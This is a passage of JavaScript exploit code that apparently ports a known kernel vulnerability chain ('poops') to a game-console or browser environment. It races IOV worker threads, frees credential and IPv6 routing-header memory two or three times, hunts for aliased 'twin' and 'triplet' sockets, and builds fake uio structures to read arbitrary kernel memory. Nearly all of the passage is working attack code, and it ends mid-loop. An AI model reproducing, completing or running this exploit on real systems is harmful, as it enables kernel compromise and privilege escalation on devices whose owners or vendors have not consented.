                wake[i].wid +
                "-name=" +
                wake[i].name +
                "-fd=" +
                wake[i].fd +
                "-ret=" +
                retOf(i),
            );
            throw new Error(
              "flush round " +
                k +
                ": wake write for " +
                wake[i].name +
                " (fd " +
                wake[i].fd +
                ") returned " +
                retOf(i) +
                ", not 1; racer still parked in read()",
            );
          }

        if (probeRound) {
          await sleep(2);
          blockedAfterSignal = 0;
          awakeAfterSignal = 0;
          for (const wid of g.wids) {
            if (g.S.get("finished", wid) === 0) blockedAfterSignal++;
            if (g.S.get("awake", wid) !== 0) awakeAfterSignal++;
          }

          queueEvent(
            "IOV-BLOCKED",
            "stillBlocked=" +
              blockedAfterSignal +
              "-of-" +
              g.wids.length +
              "-leftReadGate=" +
              awakeAfterSignal +
              "-of-" +
              g.wids.length +
              "-before-any-release-byte",
          );

          await runBuilt("flush-release", () => {
            armRet(1);
            emit(PSYS.WRITE, retPtr(0), S.iovSockB, b.scratchBig.base, 1);
          });
        }

        await H.waitFinished(
          g,
          PK.WAIT_DEADLINE_MS,
          (why || "flush") + ":" + k,
        );
        if (firstRecvmsgRet === null) {
          firstRecvmsgRet = g.S.s32("workret", g.wids[0]);
          queueEvent(
            "IOV-RECVMSG-RET",
            "worker0=" + firstRecvmsgRet + "-expect=-1-or-14-EFAULT-round=" + k,
          );
        }

        await readReleaseByte("flush");

        queueEvent("IOV-ROUND", "k=" + k + "-of-" + rounds);
      }
    } finally {
      H.setSignalMarksQuiet(wasQuiet);
    }
    return {
      rounds,
      firstRecvmsgRet,
      blockedAfterSignal,
      awakeAfterSignal,
      iovRacers: g.wids.length,
    };
  }

  function forceSettled(g, why) {
    if (g.settled) return false;
    g.settled = true;
    flushMark("GROUP-FORCE-SETTLED", g.name + "-why=" + why);
    return true;
  }

  function bankFd(idx) {
    const fd = TW.S.fds[idx];
    if (fd === undefined)
      throw new Error("no IPv6 socket at bank index " + idx);
    return fd;
  }

  function emitFreeRthdr(idx, cell) {
    emit(
      PSYS.SETSOCKOPT,
      retPtr(cell),
      bankFd(idx),
      K.IPPROTO_IPV6,
      K.IPV6_RTHDR,
      0,
      0,
    );
  }

  function emitGetRthdr(idx, dstPtr, lenPtr, cell) {
    emit(
      PSYS.GETSOCKOPT,
      retPtr(cell),
      bankFd(idx),
      K.IPPROTO_IPV6,
      K.IPV6_RTHDR,
      dstPtr,
      lenPtr,
    );
  }

  async function armLineA(reason) {
    if (S.triggered) return S.triggered;
    S.triggered = String(reason)
      .replace(/[\r\n\t]+/g, " ")
      .slice(0, 300);
    flushMark("TRIGGER-ARMED", S.triggered.slice(0, 150));
    try {
      await latch.escalate(
        "poops trigger armed: " +
          S.triggered +
          " -- one 0x180 chunk may now be on the UMA free list twice",
      );
    } catch (e) {}
    flushMark("TRIGGER-FIRED", "family=" + S.triggerFamily);
    return S.triggered;
  }

  async function triggerNetcontrol() {
    needStub(PSYS.NETCONTROL, "netcontrol trigger family");
    needStub(PSYS.SETUID, "fresh ucred for the netcontrol trigger");
    needStub(PSYS.DUP, "crfree = close(dup(uaf_socket))");
    const b = S.buf;

    if (TW.corrupt)
      return {
        ok: false,
        terminal: true,
        why:
          "REFUSED: an alias already exists (" + TW.corrupt.slice(0, 120) + ")",
      };

    if (S.uafSock >= 0 && !S.uafClosed) {
      await sys(PSYS.CLOSE, S.uafSock);
      untrack(S.uafSock);
      flushMark(
        "NETCTRL-UAF-RECYCLED",
        "closed=" + S.uafSock + "-before-new-sandwich (lua:665)",
      );
      S.uafSock = -1;
    }

    const ds = await sys(PSYS.SOCKET, K.AF_UNIX, K.SOCK_STREAM, 0);
    if (ds.failed) throw new Error("discard socket failed: " + ds.errText);
    const discard = ds.s32;
    track(discard);
    w32(b.setBuf.u8, 0, discard);

    flushMark(
      "NETCTRL-SET-PRE",
      "slot=-1-cmd=0x" +
        PK.NET_CONTROL_NETEVENT_SET_QUEUE.toString(16) +
        "-fd=" +
        discard +
        "-buf=0x" +
        b.setBuf.base.toString(),
    );
    let slot = 0;
    let r = await sys(
      PSYS.NETCONTROL,
      i64(M1LO, M1HI),
      PK.NET_CONTROL_NETEVENT_SET_QUEUE,
      b.setBuf.base,
      8,
    );
    flushMark("NETCTRL-SET", "slot=-1-ret=" + r.s32 + "-" + r.errText);
    if (r.failed || r.s32 !== 0) {
      flushMark("NETCTRL-SET-PRE", "slot=1-fallback (poops.c:685-694)");
      r = await sys(
        PSYS.NETCONTROL,
        1,
        PK.NET_CONTROL_NETEVENT_SET_QUEUE,
        b.setBuf.base,
        8,
      );
      flushMark("NETCTRL-SET", "slot=1-ret=" + r.s32 + "-" + r.errText);
      if (r.failed || r.s32 !== 0) {
        await sys(PSYS.CLOSE, discard);
        untrack(discard);
        return {
          ok: false,
          terminal: true,
          why:
            "all netcontrol slots occupied (poops.c:690-693); " +
            "nothing freed",
        };
      }
      slot = 1;
    }

    await armLineA(
      "netcontrol SET_QUEUE took slot " +
        slot +
        " on fd " +
        discard +
        "; next setuid(1) is irreversible for the boot",
    );

    await sys(PSYS.CLOSE, discard);
    untrack(discard);
    await sys(PSYS.SETUID, 1);
    S.setuidCalls++;
    const us = await sys(PSYS.SOCKET, K.AF_UNIX, K.SOCK_STREAM, 0);
    if (us.failed) throw new Error("uaf socket failed: " + us.errText);
    S.uafSock = us.s32;
    S.uafClosed = false;
    S.uafSocks.push(S.uafSock);
    track(S.uafSock);
    await sys(PSYS.SETUID, 1);
    S.setuidCalls++;
    flushMark(
      "NETCTRL-UAF",
      "uaf_sock=" +
        S.uafSock +
        "-reusedFdNumber=" +
        (S.uafSock === discard ? "YES" : "NO-" + discard) +
        "-setuidCalls=" +
        S.setuidCalls,
    );

    w32(b.clrBuf.u8, 0, S.uafSock);
    flushMark(
      "NETCTRL-CLEAR-PRE",
      "slot=" +
        slot +
        "-cmd=0x" +
        PK.NET_CONTROL_NETEVENT_CLEAR_QUEUE.toString(16) +
        "-fd=" +
        S.uafSock,
    );
    const cr = await sys(
      PSYS.NETCONTROL,
      slot,
      PK.NET_CONTROL_NETEVENT_CLEAR_QUEUE,
      b.clrBuf.base,
      8,
    );
    flushMark("NETCTRL-CLEAR", "ret=" + cr.s32 + "-" + cr.errText);
    return {
      ok: true,
      slot,
      uaf: S.uafSock,
      reused: S.uafSock === discard,
      setRet: 0,
      clearRet: cr.s32,
    };
  }

  async function crfree(why) {
    if (S.triggerFamily === "none") {
      queueEvent("CRFREE-SKIPPED", "negative-control-" + why);
      return { skipped: true };
    }
    if (S.triggerFamily === "netcontrol") {
      if (S.uafSock < 0) throw new Error("crfree: no uaf_socket");
      const d = await sys(PSYS.DUP, S.uafSock);
      if (d.failed || d.s32 < 0)
        return { failed: true, why: "dup(uaf) -> " + d.errText };
      await sys(PSYS.CLOSE, d.s32);
      S.crfrees++;
      queueEvent("CRFREE", "dup=" + d.s32 + "-n=" + S.crfrees + "-" + why);
      return { fd: d.s32, n: S.crfrees };
    }

    if (S.freeFdIdx >= S.freeFds.length)
      throw new Error(
        "crfree: free_fds pool exhausted (idx=" +
          S.freeFdIdx +
          "/" +
          S.freeFds.length +
          ")",
      );
    const fd = S.freeFds[S.freeFdIdx];
    S.freeFdIdx++;
    await sys(PSYS.CLOSE, fd);
    untrack(fd);
    S.crfrees++;
    queueEvent(
      "CRFREE",
      "poolfd=" +
        fd +
        "-idx=" +
        S.freeFdIdx +
        "-of-" +
        S.freeFds.length +
        "-" +
        why,
    );
    return { fd, n: S.crfrees };
  }

  async function preFlushAct() {
    if (S.triggerFamily === "netcontrol") return await triggerNetcontrol();
    if (S.triggerFamily === "overflow") {
      if (!S.freeFds.length)
        return {
          ok: false,
          terminal: true,
          why:
            "free-fd pool was never built (burn=" +
            (S.burnMode || "probe") +
            ")",
        };
      if (S.freeFdIdx >= S.freeFds.length)
        return {
          ok: false,
          terminal: true,
          why:
            "free-fd pool exhausted (idx=" +
            S.freeFdIdx +
            "/" +
            S.freeFds.length +
            ")",
        };
      await armLineA(
        "closing pool fd " +
          S.freeFds[S.freeFdIdx] +
          " (crfree " +
          (S.crfrees + 1) +
          "); frees the ucred if cr_ref is 1",
      );
      return await crfree("preflush");
    }
    return { skipped: true };
  }

  const STEPS = [
    "s0-free-all-rthdrs",
    "s1-pre-flush-act",
    "s2-iov-flush-32",
    "s3-post-flush-crfree",
    "s4-find-twins",
    "s5-free-twin1",
    "s6-reclaim-loop",
    "s7-third-crfree",
    "s8-find-triplet-1",
    "s9-release-iovecs",
    "s10-find-triplet-2",
    "s11-resettle",
  ];

  async function attemptRace(opts) {
    const o = opts || {}, n = TW.S.n, b = S.buf;
    const rep = {
      ok: false, step: "", detail: "", twins: null,
      reclaimRounds: -1, tripletAttempts: [-1, -1]
    };
    const at = (s) => {
      rep.step = s;
      S.attemptReached = s;
      queueEvent("RACE-STEP", s);
    };

    at(STEPS[0]);
    if (TW.corrupt) {
      rep.detail = "REFUSED: an alias already exists (" + TW.corrupt + ")";
      return rep;
    }
    await runBuilt("free-all-rthdrs", () => {
      armRet(n);
      for (let i = 0; i < n; ++i) if (!TW.isBurned(i)) emitFreeRthdr(i, i);
    });
    let freeFail = 0;
    for (let i = 0; i < n; ++i) if (retOf(i) !== 0) freeFail++;
    if (freeFail)
      queueEvent("RACE-FREEALL-PARTIAL", "failed=" + freeFail + "-of-" + n);

    at(STEPS[1]);
    const pre = await preFlushAct();
    if (pre && pre.ok === false) {
      rep.detail = "trigger did not arm: " + (pre.why || "?");
      rep.terminal = !!pre.terminal;
      return rep;
    }
    flushQueueSoft();
    const mk0 = markStats();
    const mkOpen = { q: mk0.queued, b: mk0.blocked };
    const winT0 = Date.now();
    const closeWindow = () => {
      rep.windowMs = Date.now() - winT0;
      if (!haveMarkStats) return;
      const mk1 = markStats();
      rep.marksQueuedInWindow = mk1.queued - mkOpen.q;
      rep.marksBlockedInWindow = mk1.blocked - mkOpen.b;
    };
    at(STEPS[2]);
    const fl = await flushIovWorkers(PK.IOV_FLUSH_ROUNDS, "attempt");
    rep.recvmsgRet = fl.firstRecvmsgRet;
    rep.blockedAfterSignal = fl.blockedAfterSignal;
    rep.awakeAfterSignal = fl.awakeAfterSignal;
    rep.iovRacers = fl.iovRacers;

    at(STEPS[3]);
    await crfree("post-flush double free");

    at(STEPS[4]);
    const wasScanQuiet = TW.setScanMarksQuiet(true);
    let tw;
    try {
      tw = await TW.findTwins({
        attempts: PK.MAX_ROUNDS_TWIN,
        batch: 1,
        deadlineMs: o.twinDeadlineMs || 20000
      });
    } finally {
      TW.setScanMarksQuiet(wasScanQuiet);
    }
    closeWindow();
    flushQueueSoft();
    if (!tw.found && tw.total)
      flushMark(
        "TWIN-SCAN-DONE",
        "reason=" + (tw.reason || "?") + "-attempts=" + tw.attempts
          + "-ms=" + tw.ms + "-totSprayFail=" + tw.total.sprayFailCount
          + "-totReadFail=" + tw.total.readFailCount + "-totSelf="
          + tw.total.selfTagged + "of" + tw.total.examined
      );
    if (!tw.found) {
      rep.detail = "no twin in " + tw.attempts + " rounds ("
        + (tw.reason || "?") + "). " + (S.triggered
        ? "trigger fired: F6 or F7, indistinguishable from here"
        : "negative control: expected");
      return rep;
    }
    rep.twins = [tw.i, tw.j];
    at(STEPS[5]);
    flushMark(
      "LINE-B",
      "free_rthdr(twins[1]=" + tw.j + ") -- socket " + tw.i
        + " now holds a dangling ip6po_rthdr"
    );
    await runBuilt("free-twin1", () => {
      armRet(3);
      emitFreeRthdr(tw.j, 0);
      emit(PSYS.SCHED_YIELD, retPtr(1));
      emit(PSYS.SCHED_YIELD, retPtr(2));
    });
    at(STEPS[6]);
    let reclaimed = false;
    const t6 = Date.now();
    const deadline6 = t6 + (o.reclaimDeadlineMs || 30000);
    let k = 0;
    for (; k < PK.MAX_ROUNDS_TRIPLET; ++k) {
      if (Date.now() > deadline6) break;
      await H.signal(S.iovGroup, PK.SIGNAL_DEADLINE_MS, "reclaim:" + k);
      for (let z = 0; z < 8; ++z) b.readback.u8[z] = 0xee;
      w32(b.lenOut.u8, 0, 8);
      await runBuilt("reclaim-probe", () => {
        armRet(5);
        emit(PSYS.SCHED_YIELD, retPtr(0));
        emit(PSYS.SCHED_YIELD, retPtr(1));
        emit(PSYS.SCHED_YIELD, retPtr(2));
        emit(PSYS.SCHED_YIELD, retPtr(3));
        emitGetRthdr(tw.i, b.readback.base, b.lenOut.base, 4);
      });
      if (retOf(4) === 0 && r32(b.readback.u8, 0) === 1) {
        reclaimed = true;
        flushMark(
          "RECLAIM-WIN",
          "round=" + k + "-u32[0]=1-optlenOut=" + r32(b.lenOut.u8, 0)
        );
        break;
      }
      await runBuilt("reclaim-drain-w", () => {
        armRet(1);
        emit(PSYS.WRITE, retPtr(0), S.iovSockB, b.scratchBig.base, 1);
      });
      await H.waitFinished(S.iovGroup, PK.WAIT_DEADLINE_MS, "reclaim:" + k);
      await readReleaseByte("reclaim-drain-r");
    }
    rep.reclaimRounds = k;
    if (!reclaimed) {
      rep.detail = "reclaim loop exhausted " + k
        + " rounds without u32[0]==1; socket " + tw.i
        + " holds a dangling routing header";
      await releaseIovAndSettle("reclaim-failed");
      if (TW.burn(tw.i, "dangling after lost s6 reclaim")) rep.burned = 1;
      if (TW.burn(tw.j, "twin of " + tw.i + ", freed at LINE B"))
        rep.burned = 2;
      TW.clearCorrupt(
        "both aliased sockets burned out of the bank; "
          + "that chunk is no longer freed or sprayed"
      );
      rep.retryable = true;
      return rep;
    }
    at(STEPS[7]);
    TW.S.triplets[0] = tw.i;
    await crfree("third free -- poops.c:745-746 / poops_ps5.lua:690-691");
    await yieldN(1);
    for (let z = 0; z < 8; ++z) b.readback.u8[z] = 0xee;
    w32(b.lenOut.u8, 0, 8);
    await runBuilt("post-third-free-probe", () => {
      armRet(1);
      emitGetRthdr(tw.i, b.readback.base, b.lenOut.base, 0);
    });
    flushMark(
      "POST-THIRD-FREE",
      "master=" + tw.i + "-ret=" + retOf(0) + "-word0=0x"
        + r32(b.readback.u8, 0).toString(16) + "-word4=0x"
        + r32(b.readback.u8, 4).toString(16) + "-optlenOut="
        + r32(b.lenOut.u8, 0) + "-verdict="
        + (r32(b.readback.u8, 0) === 1
        ? "CHUNK-STILL-HELD-third-free-did-not-land"
        : "chunk-recycled-fault-is-downstream")
    );
    at(STEPS[8]);
    const t1 = await TW.findTriplet(TW.S.triplets[0], -1, {
      attempts: PK.MAX_ROUNDS_TRIPLET,
      deadlineMs: o.tripletDeadlineMs || 30000
    });
    rep.tripletAttempts[0] = t1.attempts;
    if (t1.j < 0) {
      rep.detail = "find_triplet #1 returned -1 (" + (t1.reason || "?")
        + "/" + (t1.why || "?") + ") after " + t1.attempts + " rounds";
      await releaseIovAndSettle("triplet1-failed");
      return rep;
    }
    TW.S.triplets[1] = t1.j;
    at(STEPS[9]);
    await runBuilt("release-iovecs", () => {
      armRet(1);
      emit(PSYS.WRITE, retPtr(0), S.iovSockB, b.scratchBig.base, 1);
    });
    at(STEPS[10]);
    const t2 = await TW.findTriplet(TW.S.triplets[0], TW.S.triplets[1], {
      attempts: PK.MAX_ROUNDS_TRIPLET,
      deadlineMs: o.tripletDeadlineMs || 30000
    });
    rep.tripletAttempts[1] = t2.attempts;
    at(STEPS[11]);
    await H.waitFinished(S.iovGroup, PK.WAIT_DEADLINE_MS, "attempt-resettle");
    await readReleaseByte("resettle-read");
    if (t2.j < 0) {
      TW.S.triplets[2] = -1;
      rep.detail = "find_triplet #2 returned -1 (" + (t2.reason || "?")
        + "/" + (t2.why || "?") + ")";
      return rep;
    }
    TW.S.triplets[2] = t2.j;
    rep.ok = TW.tripletsValid();
    rep.detail = rep.ok ? "triplets " + TW.S.triplets.join(",") + " (fds "
      + TW.S.triplets.map(bankFd).join(",") + ")"
      : "find_triplet returned " + TW.S.triplets.join(",")
        + " but tripletsValid() is false";
    return rep;
  }

  async function releaseIovAndSettle(why) {
    const b = S.buf;
    try {
      await runBuilt("release-w-" + why, () => {
        armRet(1);
        emit(PSYS.WRITE, retPtr(0), S.iovSockB, b.scratchBig.base, 1);
      });
      await H.waitFinished(S.iovGroup, PK.WAIT_DEADLINE_MS, "release:" + why);
      await runBuilt("release-r-" + why, () => {
        armRet(1);
        emit(PSYS.READ, retPtr(0), S.iovSockA, b.dummyByte.base, 1);
      });
      flushMark("IOV-RELEASED", why);
    } catch (err) {
      forceSettled(S.iovGroup, "release-failed-" + why);
      flushMark(
        "IOV-RELEASE-FAILED",
        why + "-" + String((err && err.message) || err).slice(0, 80),
      );
    }
  }

  async function drainUioBuffer(why, queued) {
    const b = S.buf;
    if (!(queued > 0)) {
      flushMark("UIO-DRAIN", why + "-nothing-queued");
      return;
    }
    try {
      await runBuilt("uio-drain-" + why, () => {
        armRet(1);
        emit(PSYS.READ, retPtr(0), S.uioSockA, b.scratchBig.base, queued);
      });
      flushMark("UIO-DRAIN", why + "-bytes=" + queued + "-ret=" + retOf(0));
    } catch (err) {
      flushMark(
        "UIO-DRAIN-FAILED",
        why + "-" + String((err && err.message) || err).slice(0, 80),
      );
    }
  }

  async function releaseUioAndSettle(why, size) {
    const b = S.buf;
    const g = S.uioReadGroup;
    if (!g || !g.spawned || !g.spawned.length) return;
    const n = Math.max(1, size || 8);
    try {
      await runBuilt("uio-release-" + why, () => {
        armRet(1 + PK.UIO_THREAD_NUM);
        emit(PSYS.READ, retPtr(0), S.uioSockA, b.scratchBig.base, n);
        for (let i = 0; i < PK.UIO_THREAD_NUM; ++i)
          emit(PSYS.READ, retPtr(1 + i), S.uioSockA, b.kreadResult[i].base, n);
      });
      await H.waitFinished(g, PK.WAIT_DEADLINE_MS, "uio-release:" + why);
      flushMark("UIO-RELEASED", why + "-size=" + n);
    } catch (err) {
      forceSettled(g, "uio-release-failed-" + why);
      flushMark(
        "UIO-RELEASE-FAILED",
        why + "-" + String((err && err.message) || err).slice(0, 80),
      );
    }
  }

  async function releaseUioWriteAndSettle(why, size) {
    const b = S.buf;
    const g = S.uioWriteGroup;
    if (!g || !g.spawned || !g.spawned.length) return;
    const n = Math.max(1, size || 8);
    try {
      await runBuilt("uioW-release-" + why, () => {
        armRet(PK.UIO_THREAD_NUM);
        for (let i = 0; i < PK.UIO_THREAD_NUM; ++i)
          emit(PSYS.WRITE, retPtr(i), S.uioSockB, b.uioWriteBuf.base, n);
      });
      await H.waitFinished(g, PK.WAIT_DEADLINE_MS, "uioW-release:" + why);
      flushMark("UIOW-RELEASED", why + "-size=" + n);
    } catch (err) {
      forceSettled(g, "uioW-release-failed-" + why);
      flushMark(
        "UIOW-RELEASE-FAILED",
        why + "-" + String((err && err.message) || err).slice(0, 80)
      );
    }
  }

  async function stage0(options) {
    const settings = options || {};
    let maxAttempts = settings.attempts;

    if (!maxAttempts) {
      if (S.triggerFamily === "netcontrol") {
        maxAttempts = PK.NETCTRL_ATTEMPTS;
      } else if (S.triggerFamily === "overflow") {
        maxAttempts = PK.TRIPLEFREE_ATTEMPTS;
      } else {
        maxAttempts = 1;
      }
    }

    const deadlineAt = Date.now() + (settings.deadlineMs || 180000);
    const startedAt = Date.now();
    const log = [];
    let lastReport = null;

    for (let attempt = 1; attempt <= maxAttempts; attempt += 1) {
      if (Date.now() > deadlineAt) {
        return {
          ok: false,
          attempts: attempt - 1,
          ms: Date.now() - startedAt,
          log: log,
          why: "wall-clock deadline"
        };
      }

      flushMark(
        "STAGE0-ATTEMPT",
        attempt +
          "-of-" +
          maxAttempts +
          "-family=" +
          S.triggerFamily +
          "-freeFdIdx=" +
          S.freeFdIdx +
          "-crfrees=" +
          S.crfrees
      );
      S.attemptsRun = attempt;
      const attemptStartedAt = Date.now();

      const previousRaceMode = setRaceMode(true);
      let report;
      try {
        report = await attemptRace(settings);
      } finally {
        setRaceMode(previousRaceMode);
      }

      const attemptElapsedMs = Date.now() - attemptStartedAt;
      lastReport = report;

      flushMark(
        "IOV-FLUSH-DONE",
        "attempt=" +
          attempt +
          "-rounds=" +
          PK.IOV_FLUSH_ROUNDS +
          "-stillBlocked=" +
          report.blockedAfterSignal +
          "-of-" +
          report.iovRacers +
          "-leftReadGate=" +
          report.awakeAfterSignal +
          "-recvmsgRet=" +
          report.recvmsgRet +
          "-step=" +
          report.step
      );

      const markSnapshot = markStats();
      flushMark(
        "MARK-BUDGET",
        "attempt=" +
          attempt +
          "-attemptMs=" +
          attemptElapsedMs +
          "-windowMs=" +
          (report.windowMs === undefined ? -1 : report.windowMs) +
          "-windowQueued=" +
          (report.marksQueuedInWindow === undefined
            ? -1
            : report.marksQueuedInWindow) +
          "-windowBlocked=" +
          (report.marksBlockedInWindow === undefined
            ? -1
            : report.marksBlockedInWindow) +
          "-runQueued=" +
          markSnapshot.queued +
          "-runBlocked=" +
          markSnapshot.blocked +
          "-PREV-MEASURED-attemptMs=13910" +
          "-PREDICTED=550to700"
      );

      log.push(
        "a" +
          attempt +
          ": " +
          report.step +
          (report.detail ? " -- " + report.detail.slice(0, 160) : "")
      );

      if (report.ok) {
        flushMark(
          "STAGE0-OK",
          "attempt=" +
            attempt +
            "-triplets=" +
            TW.S.triplets.join(".") +
            "-ms=" +
            (Date.now() - startedAt)
        );
        await sleep(PK.SUCCESS_SETTLE_MS);
        return {
          ok: true,
          attempts: attempt,
          ms: Date.now() - startedAt,
          log: log,
          last: report
        };
      }

      if (report.terminal) {
        return {
          ok: false,
          attempts: attempt,
          ms: Date.now() - startedAt,
          log: log,
          why: "attempt could not arm: " + (report.detail || "?"),
          last: report
        };
      }

      if (TW.corrupt) {
        return {
          ok: false,
          attempts: attempt,
          ms: Date.now() - startedAt,
          log: log,
          why: "alias exists, attempt_race not re-enterable: " + TW.corrupt,
          last: report
        };
      }

      await sleepK(PK.ATTEMPT_GAP_MS);
    }

    return {
      ok: false,
      attempts: maxAttempts,
      ms: Date.now() - startedAt,
      log: log,
      why: "all " + maxAttempts + " attempts failed",
      last: lastReport
    };
  }

  function buildUio(dst, iovPtr, td, isRead, kaddr, size) {
    const u8 = dst.u8;
    w64(u8, PK.OFF.UIO_IOV, iovPtr);
    w64(u8, PK.OFF.UIO_IOVCNT, PK.UIO_IOV_COUNT);
    w64(u8, PK.OFF.UIO_OFFSET, i64(M1LO, M1HI));
    w64(u8, PK.OFF.UIO_RESID, size);
    w32(u8, PK.OFF.UIO_SEGFLG, PK.UIO_SYSSPACE);
    w32(u8, PK.OFF.UIO_RW, isRead ? 1 : 0);
    w64(u8, PK.OFF.UIO_TD, td);
    w64(u8, PK.SIZEOF_UIO + 0x00, kaddr);
    w64(u8, PK.SIZEOF_UIO + 0x08, size);
  }

  async function readReleaseByte(label) {
    const b = S.buf;
    await runBuilt("relbyte-" + label, () => {
      armRet(1);
      emit(PSYS.READ, retPtr(0), S.iovSockA, b.dummyByte.base, 1);
    });
    return retOf(0);
  }

  async function kreadSlow(kaddr, size, opts) {
    const o = opts || {};
    const b = S.buf;
    S.kreadCalls++;
    const out = {
      ok: false,
      why: "",
      buf: null,
      loopA: -1,
      loopB: -1,
      leakedIov: null,
      hits: [],
    };

    if (!TW.tripletsValid()) {
      out.why = "triplets invalid on entry";
      return out;
    }

    if (!isKernelPtr(kaddr) || !isAligned8(kaddr)) {
      out.why =
        "REFUSED: kaddr " +
        hx(kaddr) +
        " not a canonical 8-aligned kernel pointer";
      flushMark("KREAD-REFUSED", out.why.slice(0, 150));
      return out;
    }
    flushMark(
      "KREAD-PRE",
      "kaddr=" +
        hx(kaddr) +
        "-size=" +
        size +
        "-triplets=" +
        TW.S.triplets.join(".") +
        "-call=" +
        S.kreadCalls,
    );

    for (let i = 0; i < 64; i += 8)
      w64(b.uioReadBuf.u8, i, i64(0x41414141, 0x41414141));
    for (let i = 0; i < PK.UIO_THREAD_NUM; ++i)
      for (let j = 0; j < size; ++j) b.kreadResult[i].u8[j] = 0;
    w32(b.sndbuf.u8, 0, size);
    w64(b.uioIovRead.u8, 0x08, size);

    await runBuilt("kread-pre", () => {
      armRet(6);
      emit(
        PSYS.SETSOCKOPT,
        retPtr(0),
        S.uioSockB,
        K.SOL_SOCKET,
        K.SO_SNDBUF,
        b.sndbuf.base,
        4,
      );
      emit(PSYS.WRITE, retPtr(1), S.uioSockB, b.scratchBig.base, size);
      emitFreeRthdr(TW.S.triplets[1], 2);
      emit(PSYS.SCHED_YIELD, retPtr(3));
      emit(PSYS.SCHED_YIELD, retPtr(4));
      emit(PSYS.SCHED_YIELD, retPtr(5));
    });

    let uioQueued = retOf(1) > 0 ? retOf(1) : 0;

    let found = false,
      itA = 0;
    const deadA = Date.now() + (o.loopDeadlineMs || 30000);
    for (; itA < PK.RECLAIM_ROUNDS; ++itA) {
      if (Date.now() > deadA) break;
      await H.signal(S.uioReadGroup, PK.SIGNAL_DEADLINE_MS, "kreadA:" + itA);
      w32(b.lenOut.u8, 0, 16);
      for (let z = 0; z < 16; ++z) b.readback.u8[z] = 0xee;
      await runBuilt("kreadA-probe", () => {
        armRet(2);
        emit(PSYS.SCHED_YIELD, retPtr(0));
        emitGetRthdr(TW.S.triplets[0], b.readback.base, b.lenOut.base, 1);
      });

      if (
        retOf(1) === 0 &&
        r32(b.readback.u8, PK.OFF.UIO_IOVCNT) === PK.UIO_IOV_COUNT
      ) {
        found = true;
        break;
      }

      await runBuilt("kreadA-drain", () => {
        armRet(1 + PK.UIO_THREAD_NUM);
        emit(PSYS.READ, retPtr(0), S.uioSockA, b.scratchBig.base, size);
        for (let i = 0; i < PK.UIO_THREAD_NUM; ++i)
          emit(
            PSYS.READ,
            retPtr(1 + i),
            S.uioSockA,
            b.kreadResult[i].base,
            size,
          );
      });
      await H.waitFinished(
        S.uioReadGroup,
        PK.WAIT_DEADLINE_MS,
        "kreadA:" + itA,
      );
      await runBuilt("kreadA-refill", () => {
        armRet(1);
        emit(PSYS.WRITE, retPtr(0), S.uioSockB, b.scratchBig.base, size);
      });
      uioQueued = retOf(0) > 0 ? retOf(0) : 0;
    }
    out.loopA = itA;
    if (!found) {
      out.why =
        "loop A exhausted " +
        itA +
        " rounds: no writev uio " +
        "in the freed chunk";
      forceSettled(S.uioReadGroup, "kreadA-exhausted");

      await drainUioBuffer("kreadA-exhausted", uioQueued);
      return out;
    }

    const leaked = r64(b.readback.u8, PK.OFF.UIO_IOV);
    out.leakedIov = leaked;
    if (isZero64(leaked) || !isKernelPtr(leaked)) {
      out.why = "leaked_iov " + hx(leaked) + " is not canonical";
      await releaseUioAndSettle("kreadA-bad-iov", size);
      return out;
    }

    if (S.leakedIovFirst === null) {
      S.leakedIovFirst = leaked;

      flushMark(
        "LEAKED-IOV",
        "first=" + hx(leaked) + "-chunk=" + hx(leaked.sub32(0x30)),
      );
    } else if (
      S.leakedIovFirst.low !== leaked.low ||
      S.leakedIovFirst.hi !== leaked.hi
    ) {
      out.why =
        "leaked_iov changed: was " +
        hx(S.leakedIovFirst) +
        ", now " +
        hx(leaked) +
        "; the three aliases are no longer " +
        "on one chunk";
      flushMark("LEAKED-IOV-CHANGED", out.why.slice(0, 150));
      await releaseUioAndSettle("leaked-iov-changed", size);
      return out;
    }

    buildUio(b.iovecs, leaked, 0, true, kaddr, size);
    if (!TW.tripletsValid()) {
      out.why = "triplets invalid before the iov reclaim";
      await releaseUioAndSettle("mid-triplets", size);
      return out;
    }
    await runBuilt("kread-mid", () => {
      armRet(4);
      emitFreeRthdr(TW.S.triplets[2], 0);
      emit(PSYS.SCHED_YIELD, retPtr(1));
      emit(PSYS.SCHED_YIELD, retPtr(2));
      emit(PSYS.SCHED_YIELD, retPtr(3));
    });

    queueEvent(
      "KREAD-MID",
      "freed=triplets[2]=" +
        TW.S.triplets[2] +
        "-fd=" +
        bankFd(TW.S.triplets[2]) +
        "-ret=" +
        retOf(0) +
        "-master=triplets[0]=" +
        TW.S.triplets[0] +
        "-fd=" +
        bankFd(TW.S.triplets[0]) +
        "-t1=" +
        TW.S.triplets[1] +
        "-fd=" +
        bankFd(TW.S.triplets[1]) +
        "-aliasedFds=" +
        (bankFd(TW.S.triplets[2]) === bankFd(TW.S.triplets[0])
          ? "YES-THIS-IS-THE-BUG"
          : "no"),
    );

    found = false;
    let itB = 0;
    const deadB = Date.now() + (o.loopDeadlineMs || 30000);
    for (; itB < PK.RECLAIM_ROUNDS; ++itB) {
      if (Date.now() > deadB) break;
      await H.signal(S.iovGroup, PK.SIGNAL_DEADLINE_MS, "kreadB:" + itB);
      w32(b.lenOut.u8, 0, 64);
      for (let z = 0; z < 64; ++z) b.readback.u8[z] = 0xee;
      await runBuilt("kreadB-probe", () => {
        armRet(6);
        for (let y = 0; y < 5; ++y) emit(PSYS.SCHED_YIELD, retPtr(y));
        emitGetRthdr(TW.S.triplets[0], b.readback.base, b.lenOut.base, 5);
      });

      if (
        retOf(5) === 0 &&
        r32(b.readback.u8, PK.OFF.UIO_SEGFLG) === PK.UIO_SYSSPACE
      ) {
        found = true;
        break;
      }

      if (!out.segSeen) out.segSeen = new Map();

      const segLen = r32(b.lenOut.u8, 0) >>> 0;

      const segW0 = r64(b.readback.u8, 0);
      const segK =
        retOf(5) !== 0
          ? "ret=" + retOf(5)
          : "outLen=" +
            segLen +
            "-word0=" +
            hx(segW0) +
            "-segflg=0x" +
            (r32(b.readback.u8, PK.OFF.UIO_SEGFLG) >>> 0).toString(16) +
            "-iovcnt=0x" +
            (r32(b.readback.u8, PK.OFF.UIO_IOVCNT) >>> 0).toString(16);
      const segPrev = out.segSeen.get(segK);
      if (segPrev) segPrev.n++;
      else if (out.segSeen.size < 10)
        out.segSeen.set(segK, { n: 1, firstRound: itB });
      await runBuilt("kreadB-drain-w", () => {
        armRet(1);
        emit(PSYS.WRITE, retPtr(0), S.iovSockB, b.scratchBig.base, 1);
      });
      await H.waitFinished(S.iovGroup, PK.WAIT_DEADLINE_MS, "kreadB:" + itB);
